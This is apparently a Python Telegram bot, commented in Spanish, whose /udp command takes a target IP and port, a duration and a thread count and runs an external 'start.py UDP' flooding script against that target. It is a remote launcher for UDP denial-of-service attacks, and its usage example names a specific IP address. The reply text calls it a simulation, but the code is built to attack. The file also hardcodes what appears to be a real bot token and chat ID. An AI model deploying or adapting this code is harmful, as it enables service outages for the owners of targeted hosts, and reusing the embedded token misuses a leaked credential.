from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess

# Token del bot
TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"

# Lista de chats permitidos (IDs de chats o grupos de Telegram)
allowed_chats = ['-1002392775903']  # Usa el ID de tu grupo o chat aquí

# Comando para iniciar un ataque UDP
async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Verifica que el chat esté autorizado
    chat_id = str(update.effective_chat.id)
    if chat_id not in allowed_chats:
        await update.message.reply_text("Este bot no está permitido en este chat o grupo.")
        return

    # Verifica que el usuario haya ingresado los parámetros necesarios
    if len(context.args) < 3:
        await update.message.reply_text(
            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
        )
        return

    # Obtiene los argumentos del mensaje
    target = context.args[0]
    duration = context.args[1]
    threads = context.args[2]

    # Construye el comando a ejecutar
    command = f"python3 start.py UDP {target} {duration} {threads}"

    try:
        # Ejecuta el comando y captura la salida
        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Verifica si hay errores en la ejecución del comando
        if process.returncode != 0:
            await update.message.reply_text(f"Error al ejecutar el comando:\n{stderr.decode()}")
        else:
            await update.message.reply_text(
                f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
            )

    except Exception as e:
        await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")

# Configuración principal del bot
def main():
    # Crea la aplicación del bot
    application = Application.builder().token(TOKEN).build()

    # Agrega el handler para el comando /udp
    application.add_handler(CommandHandler("udp", udp_attack))

    # Inicia el bot
    application.run_polling()

if __name__ == "__main__":
    main()
